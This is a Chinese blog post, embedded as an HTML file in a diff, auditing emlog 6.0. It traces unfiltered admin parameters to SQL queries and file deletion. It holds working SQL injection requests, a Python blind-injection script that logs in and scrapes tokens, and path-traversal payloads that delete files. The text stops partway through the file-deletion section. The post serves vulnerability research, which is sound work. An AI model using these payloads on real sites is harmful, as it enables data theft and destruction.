@@ -1,0 +1,879 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta http-equiv="Content-Language" content="zh-cn">
+    <meta charset="utf-8">
+    
+    
+    
+    <title>代码审计--emlog6.0 | Somnus&#39;s blog</title>
+    <meta name="viewport" content="width=device-width,minimum-scale=1.0,maximum-scale=1.0,user-scalable=no">
+    
+    <meta name="theme-color" content="#77AAFF">
+    
+    
+    <meta name="keywords" content="代码审计">
+    
+    
+
+    
+
+    <!-- Baidu Push -->
+<script>
+	(function(){
+		var bp = document.createElement('script');
+		var curProtocol = window.location.protocol.split(':')[0];
+		if (curProtocol === 'https') {
+			bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+		}
+		else {
+			bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+		}
+		var s = document.getElementsByTagName("script")[0];
+		s.parentNode.insertBefore(bp, s);
+	})();
+
+	var _hmt = _hmt || [];
+</script>
+
+
+
+    
+    <meta name="description" content="代码审计">
+<meta name="keywords" content="代码审计">
+<meta property="og:type" content="article">
+<meta property="og:title" content="代码审计--emlog6.0">
+<meta property="og:url" content="https://Foxgrin.github.io/posts/15210/index.html">
+<meta property="og:site_name" content="Somnus&#39;s blog">
+<meta property="og:description" content="代码审计">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://foxgrin.github.io/img/emlog/1.png">
+<meta property="og:image" content="https://foxgrin.github.io/img/emlog/2.png">
+<meta property="og:image" content="https://foxgrin.github.io/img/emlog/3.png">
+<meta property="og:image" content="https://foxgrin.github.io/img/emlog/4.png">
+<meta property="og:image" content="https://foxgrin.github.io/img/emlog/5.png">
+<meta property="og:image" content="https://foxgrin.github.io/img/emlog/6.png">
+<meta property="og:image" content="https://foxgrin.github.io/img/emlog/7.png">
+<meta property="og:image" content="https://foxgrin.github.io/img/emlog/8.png">
+<meta property="og:image" content="https://foxgrin.github.io/img/emlog/9.png">
+<meta property="og:image" content="https://foxgrin.github.io/img/emlog/10.png">
+<meta property="og:image" content="https://foxgrin.github.io/img/emlog/11.png">
+<meta property="og:image" content="https://foxgrin.github.io/img/emlog/12.png">
+<meta property="og:image" content="https://foxgrin.github.io/img/emlog/13.png">
+<meta property="og:image" content="https://foxgrin.github.io/img/emlog/20.png">
+<meta property="og:image" content="https://foxgrin.github.io/img/emlog/14.png">
+<meta property="og:image" content="https://foxgrin.github.io/img/emlog/15.png">
+<meta property="og:image" content="https://foxgrin.github.io/img/emlog/16.png">
+<meta property="og:image" content="https://foxgrin.github.io/img/emlog/17.png">
+<meta property="og:image" content="https://foxgrin.github.io/img/emlog/18.png">
+<meta property="og:image" content="https://foxgrin.github.io/img/emlog/19.png">
+<meta property="og:image" content="https://foxgrin.github.io/img/emlog/21.png">
+<meta property="og:image" content="https://foxgrin.github.io/img/emlog/23.png">
+<meta property="og:image" content="https://foxgrin.github.io/img/emlog/24.png">
+<meta property="og:image" content="https://foxgrin.github.io/img/emlog/25.png">
+<meta property="og:image" content="https://foxgrin.github.io/img/emlog/26.png">
+<meta property="og:image" content="https://foxgrin.github.io/img/emlog/27.png">
+<meta property="og:image" content="https://foxgrin.github.io/img/emlog/28.png">
+<meta property="og:image" content="https://foxgrin.github.io/img/emlog/29.png">
+<meta property="og:image" content="https://foxgrin.github.io/img/emlog/30.png">
+<meta property="og:updated_time" content="2019-03-26T12:04:38.899Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="代码审计--emlog6.0">
+<meta name="twitter:description" content="代码审计">
+<meta name="twitter:image" content="https://foxgrin.github.io/img/emlog/1.png">
+    
+        <link rel="alternate" type="application/atom+xml" title="Somnus&#39;s blog" href="/atom.xml">
+    
+    <link rel="shortcut icon" href="/img/favicon.ico">
+    <link id="style" rel="stylesheet" href="/css/style.css?v=3.0">
+    <script>window.lazyScripts=[]</script>
+
+    <!-- custom head -->
+    
+            
+</head>
+
+<body>
+    <div id="loading" class="active"></div>
+    <aside id="menu"  class="hide" >
+  <div class="inner flex-row-vertical">
+    <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
+        <i class="icon icon-lg icon-close"></i>
+    </a>
+    <div class="brand-wrap" >
+      <div class="brand">
+        <a href="/" class="avatar waves-effect waves-circle waves-light">
+          <img src="/img/touxiang/1.jpg" alt="avatar">
+        </a>
+        <hgroup class="introduce">
+          <h5 class="nickname" id="name">Somnus</h5>
+          
+            <div id="yiyanmotto" class="motto">&nbsp;</div>
+          
+        </hgroup>
+      </div>
+    </div>
+    <div class="scroll-wrap flex-col">
+      <ul class="nav">
+        
+              <li class="waves-block waves-effect">
+                  <a href="/"  >
+                    <i class="icon icon-lg icon-home"></i>
+                    <span>主 页</span><i class="icon icon-lg icon-caret-left"></i>
+                  </a>
+              </li>
+            
+              <li class="waves-block waves-effect">
+                  <a href="/archives"  >
+                    <i class="icon icon-lg icon-archives"></i>
+                    <span>归 档</span><i class="icon icon-lg icon-caret-left"></i>
+                  </a>
+              </li>
+            
+              <li class="waves-block waves-effect">
+                  <a href="/categories"  >
+                    <i class="icon icon-lg icon-th-list"></i>
+                    <span>分 类</span><i class="icon icon-lg icon-caret-left"></i>
+                  </a>
+              </li>
+            
+              <li class="waves-block waves-effect">
+                  <a href="/tags"  >
+                    <i class="icon icon-lg icon-tags"></i>
+                    <span>标 签</span><i class="icon icon-lg icon-caret-left"></i>
+                  </a>
+              </li>
+            
+              <li class="waves-block waves-effect">
+                  <a href="/about"  >
+                    <i class="icon icon-lg icon-smile-o"></i>
+                    <span>关 于</span><i class="icon icon-lg icon-caret-left"></i>
+                  </a>
+              </li>
+            
+      <div class="nav2">
+          
+              <a class="nav2item" data-title="Email" href="mailto:823263808@qq.com" target="_parent"title="Email" >
+                <i class="icon icon-lg icon-envelope-o envelope-o"></i>
+              </a>
+          
+              <a class="nav2item" data-title="Github" href="https://github.com/Foxgrin" target="_blank"title="Github" >
+                <i class="icon icon-lg icon-github github"></i>
+              </a>
+          
+              <a class="nav2item" data-title="微博" href="https://weibo.com/u/6018528806" target="_blank"title="微博" >
+                <i class="icon icon-lg icon-weibo weibo"></i>
+              </a>
+          
+
+            </div>
+        
+      </ul>
+        
+    </div>
+  </div>
+ 
+</aside>
+
+
+    <main id="main">
+        <header class="top-header" id="header">
+    <div class="flex-row">
+        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light on" id="menu-toggle">
+          <i class="icon icon-lg icon-navicon"></i>
+        </a>
+        <div class="flex-col header-title ellipsis">代码审计--emlog6.0</div>
+        
+        <div class="search-wrap" id="search-wrap">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
+                <i class="icon icon-lg icon-chevron-left"></i>
+            </a>
+            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="Search">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="search">
+                <i class="icon icon-lg icon-search"></i>
+            </a>
+        </div>
+        
+        <a href="../../atom.xml" target="_blank" class="header-icon waves-effect waves-circle waves-light" id="Rss">
+            <i class="icon icon-lg icon-rss"></i>
+        </a>
+    </div>
+</header>
+<header class="content-header post-header">
+    
+    
+    <div class="container fade-scale">
+        <div id="myheader">
+            <h1 class="title">
+                
+            </h1>
+            <h5 class="subtitle">
+                
+                
+            </h5>
+        </div>
+    </div>
+
+</header>
+
+
+<div class="container body-wrap">
+    
+    <aside class="post-widget">
+        <nav class="post-toc-wrap" id="post-toc">
+            <h4>TOC</h4>
+            <ol class="post-toc"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#全局分析"><span class="post-toc-number">1.</span> <span class="post-toc-text">全局分析</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#漏洞分析"><span class="post-toc-number">2.</span> <span class="post-toc-text">漏洞分析</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#1-SQL注入"><span class="post-toc-number">2.1.</span> <span class="post-toc-text">1.SQL注入</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#2-任意文件删除漏洞"><span class="post-toc-number">2.2.</span> <span class="post-toc-text">2.任意文件删除漏洞</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#3-通过后台数据库备份上传webshell"><span class="post-toc-number">2.3.</span> <span class="post-toc-text">3.通过后台数据库备份上传webshell</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#4-通过上传ZIP文件上传webshell"><span class="post-toc-number">2.4.</span> <span class="post-toc-text">4.通过上传ZIP文件上传webshell</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#5-存储型XSS"><span class="post-toc-number">2.5.</span> <span class="post-toc-text">5.存储型XSS</span></a></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#总结"><span class="post-toc-number">3.</span> <span class="post-toc-text">总结</span></a></li></ol>
+        </nav>
+    </aside>
+   
+<article id="post-代码审计-emlog"
+  class="post-article article-type-post fade" itemprop="blogPost">
+
+    <div class="post-card">
+        <h1 class="post-card-title">代码审计--emlog6.0</h1>
+        <div class="post-meta">
+            <i class="icon icon-lg icon-calendar-o"></i>
+            发表于
+            <time class="post-time" title="2019-03-19 20:15:00" datetime="2019-03-19T12:15:00.000Z"  itemprop="datePublished">2019-03-19</time>
+
+            <br id="mybreak"/>
+            
+	<i class="icon icon-lg icon-folder-o"></i>
+	分类：<ul class="article-category-list"><li class="article-category-list-item"><a class="article-category-list-link" href="/categories/代码审计/">代码审计</a></li></ul>
+
+
+            <i>·</i>
+            
+<span id="busuanzi_container_page_pv" title="文章总阅读量" style='display:none'>
+    <i class="icon icon-eye icon-pr"></i><span id="busuanzi_value_page_pv"></span>次浏览
+</span>
+
+
+        </div>
+        <div class="post-count-custom">
+            <i class="icon icon-lg icon-comment-o"></i>
+            阅读本文可能花费您&nbsp;<span class="post-count">12</span>&nbsp;分钟
+        </div>
+        <div class="post-content" id="post-content" itemprop="postContent">
+            <p>记录emlog6.0审计过程以及漏洞分析<a id="more"></a></p>
+<h2 id="全局分析"><a href="#全局分析" class="headerlink" title="全局分析"></a>全局分析</h2><p>分析网站根目录下<code>/index.php</code>包含的头文件<code>/init.php</code>，可以发现，其中对GET,POST等进行处理的只有第二十一行的函数<code>doStripslashes()</code>，跟踪该函数，发现该函数作用居然还是去除转义字符，所以可以说，全局对GET,POST数据实际上是毫无过滤的。所以接下来，我们可以在Seay审计系统下进行全局搜索GET和POST的数据，如果没有其他过滤，那么是非常好利用的。</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/img/emlog/1.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><h3 id="1-SQL注入"><a href="#1-SQL注入" class="headerlink" title="1.SQL注入"></a>1.SQL注入</h3><p><code>/admin/comment.php</code>第46行语句<code>$ip = isset($_GET[&#39;ip&#39;]) ? $_GET[&#39;ip&#39;] : &#39;&#39;;</code>未对参数<code>$_GET[&#39;ip&#39;]</code>进行过滤，在47行中将变量<code>$ip</code>传入函数<code>delCommentByIp()</code>，跟踪该函数，在<code>/include/model/comment_model.php</code>中第152行中将该参数拼接到SQL语句，经由单引号包裹</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/img/emlog/2.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/img/emlog/3.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<p>经过全局分析我们知道实际上<code>$_GET[&#39;ip&#39;]</code>参数是没有任何过滤的，所以我们可以很轻松的进行SQL注入，这里采用的是报错注入</p>
+<p>payload如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">GET /emlog/admin/comment.php?action=delbyip&amp;ip=127.0.0.1&apos;%20and%20extractvalue(1,concat(0x3a,database(),0x3a))%23&amp;token=2559f394de1177aaf9652f6ea371566d HTTP/1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8</span><br><span class="line">Referer: http://127.0.0.1/emlog/admin/comment.php</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: em_plugin_new=block; em_link_new=inline-block; commentposter=admin01; posterurl=http%3A%2F%2F127.0.0.1%2Femlog%2F; bdshare_firstime=1551059496947; PHPSESSID=g99k0jev6eed0jpuce6tvm1jl3; EM_TOKENCOOKIE_b90fd1a800e81fa678ed0f0c7fcb8918=2559f394de1177aaf9652f6ea371566d; EM_AUTHCOOKIE_ZxwSU5f12C3Kkwq6CRTVyZyxqZwUYLbl=admin01%7C%7C812cc3b37c64625ef752ca57370b76e1</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure>
+<p>注意这里因为有检查Token机制，所以我们必须在页面上进行抓包</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/img/emlog/4.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<p>同样在<code>/admin/tag.php</code>第44行语句<code>$tags = isset($_POST[&#39;tag&#39;]) ? $_POST[&#39;tag&#39;] : &#39;&#39;;</code>未对变量<code>$_POST[&#39;tag&#39;]</code>进行过滤，在53行中将变量<code>$tags</code>的键值传入函数<code>deleteTag()</code>，跟踪函数，在<code>/include/model/tag_model.php</code>中将该变量拼接到<code>DELETE</code>语句中</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/img/emlog/5.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/img/emlog/6.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<p>因为是DELETE语句，所以这里采用延时注入，同时需要注意因为我们不能保证<code>$tagId</code>一定存在于表中，而且即便存在，执行完一次也会被删除，所以这里采用<code>or</code>连接，保证后面的延时注入语句能执行，payload如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">POST /emlog/admin/tag.php?action=dell_all_tag HTTP/1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">Content-Length: 101</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Origin: http://127.0.0.1</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8</span><br><span class="line">Referer: http://127.0.0.1/emlog/admin/tag.php</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: em_plugin_new=block; commentposter=admin01; posterurl=http%3A%2F%2F127.0.0.1%2Femlog%2F; bdshare_firstime=1551059496947; PHPSESSID=g99k0jev6eed0jpuce6tvm1jl3; BLUE[user_id]=4; BLUE[user_name]=user03; BLUE[user_pwd]=25f1d8643365bf6087fae3b2b5b012d6; EM_TOKENCOOKIE_b90fd1a800e81fa678ed0f0c7fcb8918=2559f394de1177aaf9652f6ea371566d; EM_AUTHCOOKIE_ZxwSU5f12C3Kkwq6CRTVyZyxqZwUYLbl=admin01%7C%7C812cc3b37c64625ef752ca57370b76e1</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">tag[0 or if(ascii(substr(database(),0,1))%3d101,0,sleep(3))]=1&amp;token=2559f394de1177aaf9652f6ea371566d</span><br></pre></td></tr></table></figure>
+<p>之后就是写脚本注入，但是这里同样采用了验证TOKEN机制，而且我们必须登录后台才能进行该项操作，所以需要采用python的Session机制进行登录并抓取页面TOKEN值，代码如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">(s,login_url,user,pw)</span>:</span></span><br><span class="line">    login_data = &#123;</span><br><span class="line">        <span class="string">'user'</span>:user,</span><br><span class="line">        <span class="string">'pw'</span>:pw</span><br><span class="line">        &#125;</span><br><span class="line">    r = s.post(url=login_url,data=login_data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_token</span><span class="params">(s,token_url)</span>:</span></span><br><span class="line">    r = s.get(token_url)</span><br><span class="line">    soup = BeautifulSoup(r.text,<span class="string">'lxml'</span>)</span><br><span class="line">    token = soup.find_all(<span class="string">'input'</span>,attrs=&#123;<span class="string">'name'</span>:<span class="string">'token'</span>&#125;)[<span class="number">0</span>][<span class="string">'value'</span>]</span><br><span class="line">    <span class="keyword">return</span> token</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_database</span><span class="params">(s,url,token)</span>:</span></span><br><span class="line">    database = <span class="string">""</span></span><br><span class="line">    flag = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">20</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">95</span>,<span class="number">123</span>):</span><br><span class="line">            data = &#123;</span><br><span class="line">                <span class="string">'tag[0 or if(ascii(substr(database(),%d,1))=%d,sleep(3),0)]'</span>%(i,j):<span class="string">'1'</span>,</span><br><span class="line">                <span class="string">'token'</span>:token</span><br><span class="line">            &#125;</span><br><span class="line">            start = time.perf_counter()</span><br><span class="line">            s.post(url,data=data)</span><br><span class="line">            end = time.perf_counter()</span><br><span class="line">            t = end - start</span><br><span class="line">            <span class="keyword">if</span> t &gt;= <span class="number">3</span>:</span><br><span class="line">                database = database + chr(j)</span><br><span class="line">                flag = <span class="number">1</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> j == <span class="number">122</span> <span class="keyword">and</span> flag == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        flag = <span class="number">0</span></span><br><span class="line">    print(<span class="string">"database:"</span>,database)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    s = requests.Session()</span><br><span class="line">    login_url = <span class="string">"http://127.0.0.1/emlog/admin/index.php?action=login"</span></span><br><span class="line">    login(s,login_url,<span class="string">'admin01'</span>,<span class="string">'admin01'</span>)</span><br><span class="line">    token_url = <span class="string">"http://127.0.0.1/emlog/admin/tag.php"</span></span><br><span class="line">    token = get_token(s,token_url)</span><br><span class="line">    target_url = <span class="string">"http://127.0.0.1/emlog/admin/tag.php?action=dell_all_tag"</span></span><br><span class="line">    get_database(s,target_url,token)</span><br></pre></td></tr></table></figure>
+<p><code>/admin/navbar.php</code>第78行<code>$pages = isset($_POST[&#39;pages&#39;]) ? $_POST[&#39;pages&#39;] : array();</code>存在未过滤变量<code>$pages</code>，在85行将变量<code>$pages</code>的键值作为变量<code>$id</code>传入函数<code>addNavi()</code>中，跟踪该函数，在<code>/include/model/navi_model.php</code>中将该变量拼接到<code>INSERT</code>语句中</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/img/emlog/7.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/img/emlog/8.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<p>INSERT注入我们采用的是<code>select case when 条件 then sleep(3) else 1 end</code>的延时注入，payload如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">POST /emlog/admin/navbar.php?action=add_page HTTP/1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: em_plugin_new=block; em_link_new=inline-block; commentposter=admin01; posterurl=http%3A%2F%2F127.0.0.1%2Femlog%2F; bdshare_firstime=1551059496947; PHPSESSID=g99k0jev6eed0jpuce6tvm1jl3; EM_TOKENCOOKIE_b90fd1a800e81fa678ed0f0c7fcb8918=2559f394de1177aaf9652f6ea371566d; EM_AUTHCOOKIE_ZxwSU5f12C3Kkwq6CRTVyZyxqZwUYLbl=admin01%7C%7C812cc3b37c64625ef752ca57370b76e1</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 5</span><br><span class="line"></span><br><span class="line">pages[1%2b(select case when(1%3d1) then sleep(3) else 1 end)]=1</span><br></pre></td></tr></table></figure>
+<p>脚本参考上面，这里略</p>
+<h3 id="2-任意文件删除漏洞"><a href="#2-任意文件删除漏洞" class="headerlink" title="2.任意文件删除漏洞"></a>2.任意文件删除漏洞</h3><p><code>/admin/data.php</code>第143-144行存在未过滤变量<code>$_POST[&#39;bak&#39;]</code>拼接到<code>unlink</code>中，导致任意路径穿越删除文件漏洞</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/img/emlog/9.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<p>payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">POST /emlog/admin/data.php?action=dell_all_bak HTTP/1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: em_plugin_new=block; em_link_new=inline-block; commentposter=admin01; posterurl=http%3A%2F%2F127.0.0.1%2Femlog%2F; bdshare_firstime=1551059496947; PHPSESSID=g99k0jev6eed0jpuce6tvm1jl3; EM_TOKENCOOKIE_b90fd1a800e81fa678ed0f0c7fcb8918=2559f394de1177aaf9652f6ea371566d; EM_AUTHCOOKIE_ZxwSU5f12C3Kkwq6CRTVyZyxqZwUYLbl=admin01%7C%7C812cc3b37c64625ef752ca57370b76e1</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 21</span><br><span class="line"></span><br><span class="line">bak[0]=../../hint.php</span><br></pre></td></tr></table></figure>
+<p><code>/admin/blogger.php</code>第92行存在危险函数<code>unlink</code>，跟踪变量<code>$icon_1</code>，该变量来自80行中的sql查询字段<strong>photo</strong>返回结果，跟踪语句31行中变量<code>$photo</code>通过POST传入，有转义处理，并在72行中将photo更新到数据库中，虽然有转义处理，依旧可以造成任意路径穿越删除文件</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/img/emlog/10.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/img/emlog/11.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/img/emlog/12.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/img/emlog/13.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<p>实现的过程如下：先通过POST将构造的任意路径变量<code>$photo</code>更新到数据库中（<code>$action=update</code>），再通过<code>$action=delicon</code>触发<code>unlink($icon_1)</code>，进行任意文件删除</p>
+<p>payload如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">POST /emlog/admin/blogger.php?action=update HTTP/1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">Content-Length: 979</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Origin: http://127.0.0.1</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryVzcf6UrvpBos4Orw</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8</span><br><span class="line">Referer: http://127.0.0.1/emlog/admin/blogger.php?active_del=1</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: em_plugin_new=block; em_link_new=inline-block; commentposter=admin01; posterurl=http%3A%2F%2F127.0.0.1%2Femlog%2F; bdshare_firstime=1551059496947; PHPSESSID=g99k0jev6eed0jpuce6tvm1jl3; EM_TOKENCOOKIE_b90fd1a800e81fa678ed0f0c7fcb8918=2559f394de1177aaf9652f6ea371566d; EM_AUTHCOOKIE_ZxwSU5f12C3Kkwq6CRTVyZyxqZwUYLbl=admin01%7C%7C812cc3b37c64625ef752ca57370b76e1</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryVzcf6UrvpBos4Orw</span><br><span class="line">Content-Disposition: form-data; name=&quot;photo&quot;</span><br><span class="line"></span><br><span class="line">../../info.php</span><br></pre></td></tr></table></figure>
